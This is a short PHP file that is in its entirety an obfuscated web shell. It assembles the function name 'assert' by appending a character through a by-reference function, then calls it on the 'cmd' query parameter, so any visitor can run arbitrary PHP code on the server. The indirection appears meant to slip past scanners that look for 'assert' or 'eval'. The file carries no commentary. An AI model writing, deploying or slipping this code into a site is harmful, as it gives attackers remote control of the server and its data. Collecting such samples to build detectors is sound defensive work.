<?php
function foo(&$var)
{
    $var=$var.'t';
}
$a="asser";
foo($a);
$a($_GET[cmd]);